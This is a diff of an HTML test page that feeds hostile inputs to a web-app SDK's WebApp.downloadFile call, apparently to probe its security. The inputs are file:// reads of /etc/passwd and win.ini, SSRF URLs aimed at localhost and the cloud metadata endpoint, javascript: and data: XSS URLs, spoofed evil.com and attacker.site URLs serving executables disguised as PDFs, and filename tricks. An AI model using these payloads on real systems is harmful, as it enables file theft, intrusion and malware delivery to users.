@@ -1,52 +1,17 @@
 <script src="https://st.max.ru/js/max-web-app.js"></script>
 <script>
     WebApp.downloadFile("file:///C:/Windows/win.ini","test.html");
-</script>
-<script>
-WebApp.downloadFile({
-  url: decodeURIComponent("javascript%3Aalert('XSS%20Encoded')"),
-  name: "encoded_xss.html"
-});
-</script>
-<script>
-WebApp.downloadFile({
-  url: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
-  name: "data_xss.html"
-});
-</script>
-<script>
-WebApp.downloadFile({
-  url: "https://secure-bank.com@evil.com/dropper.exe",
-  name: "important_doc.pdf"
-});
-</script>
-<script>
-WebApp.downloadFile({
-  url: "https://evil.com/dropper.exe",
-  name: "invoiceвЂ®cod.exe"
-});
-</script>
-<script>
-WebApp.downloadFile({
-  url: "file:///etc/passwd",
-  name: "passwd.txt"
-});
-</script>
-<script>
-WebApp.downloadFile({
-  url: "https://attacker.site/malware.exe",
-  name: "document.pdf"
-});
-</script>
-<script>
-WebApp.downloadFile({
-  url: "https://evil.com/serve.php?f=malware",
-  name: "report.pdf"
-});
-</script>
-<script>
-WebApp.downloadFile({
-  url: "https://evil.com\npayload.exe",
-  name: "newline-test.txt"
-});
+    WebApp.downloadFile("file:///C:/Windows/win.ini","test.html");
+    WebApp.downloadFile("file:///etc/passwd","passwd.txt");
+    WebApp.downloadFile("http://127.0.0.1:8080/admin","localhost_admin.txt");
+    WebApp.downloadFile("http://169.254.169.254/latest/meta-data/","aws_meta.txt");
+    WebApp.downloadFile("http://internal-service.local/admin","internal.txt");
+    WebApp.downloadFile("http://secure-bank.com@evil.com/update.exe","update.pdf");
+    WebApp.downloadFile("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==","data_xss.html");
+    WebApp.downloadFile("javascript:alert(1)","xss.html");
+    WebApp.downloadFile("javascript:alert(1)","xss_unicode.html");
+    WebApp.downloadFile("blob:generated-url","blob_xss.html");
+    WebApp.downloadFile("https://attacker.site/malware.exe","document.pdf");
+    WebApp.downloadFile("https://trusted.com@evil.com/dropper.exe","spoof.exe");
+    WebApp.downloadFile("https://evil.com\npayload.exe","newline.txt");
 </script>
